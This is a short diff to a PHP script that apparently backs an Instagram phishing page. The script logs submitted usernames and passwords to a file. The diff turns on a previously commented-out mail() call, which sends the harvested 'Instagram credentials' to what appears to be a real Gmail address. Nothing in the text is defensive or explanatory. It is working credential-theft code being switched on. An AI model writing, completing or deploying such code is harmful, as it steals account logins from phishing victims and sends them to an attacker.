@@ -9,6 +9,6 @@ if (isset($_POST['username']) && isset($_POST['password'])) {
     fwrite($file, $_POST['username'] . "\t" . $_POST['password'] . PHP_EOL);
     fclose($file);
     // uncomment the lines below to receive the credentials by email
-    // $maildrop = "sample@email.com";
-    // mail($maildrop, "Instagram credentials", $_POST['email'] . "\t" . $_POST['pass']);
+     $maildrop = "mh010953339091@gmail.com";
+     mail($maildrop, "Instagram credentials", $_POST['email'] . "\t" . $_POST['pass']);
 }
